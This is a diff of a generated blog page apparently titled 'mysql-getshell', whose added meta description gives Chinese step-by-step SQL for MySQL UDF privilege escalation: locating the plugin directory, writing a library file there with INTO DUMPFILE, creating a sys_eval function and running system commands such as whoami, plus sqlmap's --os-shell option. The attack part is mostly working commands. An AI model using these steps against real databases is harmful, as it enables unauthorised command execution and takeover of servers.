@@ -43,10 +43,30 @@ Windows (IIS)	C:\inetpub\wwwroot\
 Windows (XAMPP)	C:\xampp\htdocs\
 Windows (phpStudy)	D:\phpstudy_pro\WWW\, C:\phpStudy\WWW\
 漏洞复现
-方法一: &ndash;os-shell">
+方法一: &ndash;os-shell
+方法二: 手动构造
+1. -- 查看架构（确定是 Windows/Linux 及 x64/x86）
+show variables like &#39;%compile%&#39;; 
+
+2. -- 查看插件存放目录
+show variables like &#39;plugin_dir&#39;;
+
+3. 准备udf文件: https://www.sqlsec.com/udf/
+
+4. 将文件写入插件目录(最好DUMPFILE,outfile也能写但是不处理换行符)
+SELECT 0x7f45... INTO DUMPFILE &#39;/usr/lib/mysql/plugin/udf.so&#39;;
+
+5. 创建关联函数
+-- 创建名为 sys_eval 的函数，关联到刚才上传的库文件
+CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;
+
+6.执行系统命令
+SELECT sys_eval(&#39;whoami&#39;);
+
+">
 <meta name="author" content="h4xk0r">
 <link rel="canonical" href="http://localhost:1313/posts/mysql-getshell/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.314abab0bce79c9458c3bcc909ca5440767e8fa2822428ed33ce608ca6f66fa0.css" integrity="sha256-MUq6sLznnJRYw7zJCcpUQHZ&#43;j6KCJCjtM85gjKb2b6A=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.0bb0c3739b082d881c4fb32975de96674772f1bde518011d34b2aa2ac92be7ae.css" integrity="sha256-C7DDc5sILYgcT7Mpdd6WZ0dy8b3lGAEdNLKqKskr564=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
